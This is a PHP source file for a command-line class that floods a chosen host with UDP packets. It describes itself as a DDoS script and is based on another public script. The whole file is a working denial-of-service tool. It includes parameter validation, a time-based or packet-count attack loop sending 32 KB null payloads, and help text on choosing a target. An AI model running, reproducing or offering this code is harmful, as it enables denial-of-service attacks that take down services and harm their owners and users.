<?php
/**
* Script to perform a DDoS attack on CLI
*
* @package DDOS
* @author JamesMcAvoy
* @link https://github.com/drego85/DDoS-PHP-Script Based on this script
*/

/**
* Constant used for tabulation
* @var String
*/
define('TAB', "\t");

/**
* Constant used for the packets (bit)
* @var String
*/
define('BIT', "\x00");

class DDOS {

	/**
	* Parameters used to DDoS
	* @var array
	*/
	private $params = array(
		'host' 	 => '',
		'packets' => '',
		'time'   => '',
		'port' 	 => '80',
		'bytes'	 => '32768',
		'max_exec_time' => '0'
	);

	/**
	* Error generated
	* @var String
	*/
	private $error = PHP_EOL;

	/**
	* Constructor
	* @param array $params Parameters 
	* @return void
	*/
	public function __construct(array $params = array()) {

		if($this->is_help($params))
			$this->help();

		$this->hydrate($params);

		if(!$this->defined_params()) {
			$this->println($this->error);
			$this->help();
			exit;
		}

		$this->attack();

	}

	/**
	* If the parameter is correct, place it into the params var, else return false
	* @param array $params Parameters to place
	* @return bool
	*/
	private function hydrate(array $params) {

		foreach($params as $key => $value) {
			if($this->is_valid_param($key, $value))
				$this->params[$key] = $value;
			else {
				$this->println($this->error);
				exit;
			}
		}

	}

	/**
	* Validate parameter
	* @param String $key 	key of the array
	* @param mixed  $value 	value of the key
	* @return bool
	*/
	private function is_valid_param($param, $value) {

		//Validate if the parameter exists
		$exists = false;
		foreach($this->params as $k => $v) {
			if($param == $k) {
				$exists = true;
				break;
			}
		}
		if($exists === false) {
			$this->error .= 'The parameter ' . $param . ' doesn\'t exist !';
			return false;
		}

		//Validate the host
		if($param == 'host') {

			if(preg_match('/^[a-z-\d]+\.[a-z-\d\.]+$/i', $value) ||
			   filter_var($value, FILTER_VALIDATE_IP))
				return true;
			else {
				$this->error .= 'The host (' . $value . ') isn\'t correct !';
				return false;
			}

		}
		//Else if the parameter is port
		elseif($param == 'port') {

			if(is_numeric($value) && $value >= 1 && $value <= 65535)
				return true;
			else {
				$this->error .= 'The value ' . $value . ' of the port isn\'t correct !';
				return false;
			}

		}
		//Else validate the parameter (must be numeric)
		else {

			if(is_numeric($value) && $value > 0)
				return true;
			else {
				$this->error .= 'The value ' . $value . ' of the ' . $param . ' isn\'t correct !';
				return false;
			}

		}

	}

	/**
	* Return true if host and packet or time are defined
	* @param void
	* @return bool
	*/
	private function defined_params() {

		$return = true;

		if($this->params['host'] == '') {
			$this->error .= 'Attention :' . PHP_EOL . TAB . 'The value of the host isn\'t defined !' . PHP_EOL;
			$return = false;
		}

		if($this->params['time'] == '' && $this->params['packets'] == '') {
			$this->error .= 'Attention :' . PHP_EOL . TAB . 'The value of the time or of the packet must be defined !'  . PHP_EOL;
			$return = false;
		}

		return $return;

	}

	/**
	* DDoS the host, based on the time or on the packets
	* @param void
	* @return void
	*/
	private function attack() {

		$msg = str_repeat(BIT, $this->params['bytes']);
		$packets = 0;
		$start_time = microtime(true);
		$host = $this->params['host'];

		$this->println('', 'Attack beginned !');
		sleep(.5);

		//Time based attack
		if($this->params['packets'] == '') {

			$max_time = time() + $this->params['time'];
			$time = time();

			while($time < $max_time) {
				$time = time();
				$packets++;
				$this->println('Sending packet #' . $packets . ' to ' . $host);
				if(!$this->udp_put_contents($msg)) {
					$this->println($this->error);
					exit;
				}
			}

		}
		//Packet number based attack
		else {

			$max_packets = $this->params['packets'];

			while($packets < $max_packets) {
				$packets++;
				$this->println('Sending packet #' . $packets . ' to ' . $host);
				if(!$this->udp_put_contents($msg)) {
					$this->println($this->error);
					exit;
				}
			}

		}

		//End
		$end_time = round(microtime(true) - $start_time, 3);
		if($end_time <= 1)
			$end_time = 'about 1 second';

		$this->println('Attack completed !', 'Time : ' . $end_time);

	}

	/**
	* Open a socket on UDP to the host
	* @param String message (packet) to send
	* @return bool
	*/
	private function udp_put_contents($string) {

		$host = 'udp://' . $this->params['host'];
		$port = $this->params['port'];
		$max  = $this->params['max_exec_time'];

		$socket = @fsockopen($host, $port, $errno, $errstr, $max);

		//If error during opening
		if(!$socket) {
			$this->error .= 'Error opening ' . $host . PHP_EOL;
			$this->error .= 'Error #' . $errno . ', ' . $errstr . PHP_EOL;
			return false;
		}
		//Else if opened
		else {
			//If error during sending
			if(!@fwrite($socket, $string)) {
				$this->error .= 'Error sending packet to ' . $host . PHP_EOL;
				$this->error .= 'Error #' . $errno . ', ' . $errstr . PHP_EOL;
				return false;
			}
			@fclose($socket);
		}

		return true;

	}

	/**
	* See if help is asked 
	* @param array $params Parameters
	* @return bool
	*/
	private function is_help(array $params) {

		foreach($params as $key => $value) {
			//If array like array(['0'] => 'help') or array('help' => X)
			if(is_int($key) && $value == 'help' || $key == 'help') {
				return true;
			}
		}

		return false;

	}

	/**
	* Print the help to use this class
	* @param void
	* @return void
	*/
	private function help() {
		$this->println();
		$this->println('HOW TO USE THE DDoS CLASS by JamesMcAvoy :');
		$this->println('Parameters :');
		$this->println(TAB.'[REQUIRED] host          : The IP or the address to attack');
		$this->println(TAB.'[REQUIRED] packets       : For a packet number based attack');
		$this->println(TAB.'[REQUIRED] time          : For a time based attack (in seconds)');
		$this->println('', TAB.'[OPTIONAL] port          : The port where the attack must go', TAB.TAB.'Default is 80 (HTTP port)');
		$this->println('', TAB.'[OPTIONAL] bytes         : The number of bytes to attack', TAB.TAB.'Default is 32768');
		$this->println('', TAB.'[OPTIONAL] max_exec_time : The max execution time opening a socket', TAB.TAB.'Default is 0 (infinite time)');
		$this->println('', TAB.'           help          : Print this help');
		$this->println();
		$this->println('Example of use :');
		$this->println(TAB.'php <script.php> host=<host> port=<port> packets=<packets> bytes=<bytes>');
		$this->println();
		$this->println('Note : if the parameter time and the parameter packets are defined, the attack will be based on the number of packets.');

		exit;
	}

	/**
	* Print to the console
	* @param mixed
	* @return void
	*/
	private function println() {
		$args = func_get_args();

		if(count($args) == 0)
			print PHP_EOL;

		foreach($args as $print)
			print $print . PHP_EOL;
	}

	/**
	* Return if the script is used in command line input
	* @param void
	* @return bool
	* @static
	*/
	public static function is_cli() {
		return PHP_SAPI == 'cli';
	}

	/**
	* Return the arguments used with the command line input
	* @param void
	* @return array
	* @static
	*/
	public static function getArgs() {
		global $argv;

		array_shift($argv);

		parse_str(implode('&', $argv), $params);
		
		return $params;
	}

}
